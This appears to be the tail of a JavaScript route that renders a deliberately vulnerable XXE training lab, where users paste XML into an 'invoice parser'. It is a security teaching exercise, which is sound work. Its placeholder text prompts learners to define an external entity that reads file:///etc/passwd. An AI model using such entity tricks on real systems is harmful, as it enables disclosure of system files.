    <h2>// XXE — Legacy XML Invoice Parser //</h2>
    <p style="color:#00ff4199;margin-bottom:12px;">Scenario: an old XML parser resolves external entities while importing invoices. The lab safely simulates file and metadata reads.</p>
    <form method="GET" action="">
      <div class="label">XML document</div>
      <textarea name="xml" placeholder="Paste XML with a DOCTYPE external entity...">${escapeHtml(xml)}</textarea>
      <button>[PARSE XML]</button>
    </form>
    ${parsed ? `<pre class="${parsed.success ? "green" : "red"}">${escapeHtml(parsed.message)}</pre>` : `<pre style="color:#00ff4155">// Try defining an external entity pointing at file:///etc/passwd //</pre>`}
  </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.send(html);
});

export default router;
